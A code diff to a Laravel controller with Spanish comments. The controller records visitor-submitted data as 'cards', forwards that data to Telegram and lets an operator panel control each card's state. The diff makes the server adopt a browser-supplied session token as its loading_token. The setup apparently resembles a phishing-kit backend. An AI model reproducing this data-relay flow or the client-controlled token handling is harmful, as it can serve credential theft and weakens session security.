@@ -118,7 +118,9 @@ class PublicSiteController extends Controller
                 'fecha' => now(),
                 'data' => array_merge($payload, $meta),
             ]);
-            $company->forceFill(['loading_token' => (string) Str::uuid()]);
+            $company->forceFill([
+                'loading_token' => ! empty($data['session']) ? $data['session'] : (string) Str::uuid(),
+            ]);
             $company->last_activity_at = now();
             $company->save();
             $company->registro = 'REG-'.str_pad((string) $company->id, 4, '0', STR_PAD_LEFT);
@@ -128,10 +130,6 @@ class PublicSiteController extends Controller
         // La vista del proyecto envía los datos capturados a Telegram y los deja en
         // el detalle de la tarjeta (funcionalidad normal del flujo embebido).
         $this->notifyTelegram($company, $view, $payload);
-
-        // Si un botón del panel dejó la tarjeta "pendiente de desconectar", al presionar el
-        // cliente su botón (enviar) el cambio a desconectado es inmediato.
-        $company->applyPendingOffline(true);
 
         return response()->json([
             'ok' => true,
@@ -270,7 +268,8 @@ class PublicSiteController extends Controller
             'data' => ['_proyecto' => $project->slug, '_visitante' => true],
         ]);
         $company->forceFill([
-            'loading_token' => (string) Str::uuid(),
+            // Si el navegador ya trae su propio token, se adopta (evita duplicar la tarjeta).
+            'loading_token' => ! empty($data['session']) ? $data['session'] : (string) Str::uuid(),
             'last_activity_at' => now(),
             'last_seen_at' => now(),
         ])->save();
